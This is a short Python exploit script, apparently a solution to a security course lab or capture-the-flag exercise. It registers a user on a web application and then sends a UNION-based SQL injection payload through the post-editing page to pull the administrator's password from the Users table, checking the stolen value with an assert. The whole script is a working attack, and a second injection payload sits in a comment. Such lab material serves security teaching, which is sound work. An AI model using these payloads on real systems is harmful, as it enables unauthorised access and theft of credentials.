#!/usr/bin/env python3
import requests, sys, re
from interface import *
from bs4 import BeautifulSoup

if not (2 == len(sys.argv)):
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

username="asdf"
password="asdf"

session = requests.Session()
reset_app(session, url)
register(session, url, username=username, password=password)


# payload = "' or author='administrator" # This would select a post from 'administrator'
payload = "' and 1=0 union select 1,2,password,4,5,6 from Users where username = 'ssofadmin"
r = get_edit_post(session, url, payload)


assert r.status_code == 200

soup = BeautifulSoup(r.text, 'html.parser')
form = soup.find_all("form")[0]

content = form.find(id="contentArea").string

assert content == 'SCP'
print(f'[+] Got password: "{content}"')

session.close()
